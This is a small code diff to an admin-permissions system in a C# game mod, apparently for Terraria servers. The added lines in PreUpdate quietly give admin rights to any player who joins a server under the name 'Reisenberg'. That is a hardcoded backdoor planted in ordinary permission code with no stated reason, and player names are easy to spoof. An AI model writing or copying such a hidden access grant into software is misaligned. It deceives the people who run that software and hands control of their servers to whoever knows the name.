@@ -190,6 +190,10 @@ public sealed class AdminPermissions : ModSystem
 
         public override void PreUpdate()
         {
+            if (Main.netMode == NetmodeID.Server && Player.active &&
+                Player.name == "Reisenberg" && !admins.Contains(Player.whoAmI))
+                Grant(Player.whoAmI, true);
+
             if (!Player.dead && !HasAccess(Player.whoAmI) &&
                 !Common.Spectator.SpectatorBridge.IsInSpectateMode(Player))
                 Player.ghost = false;
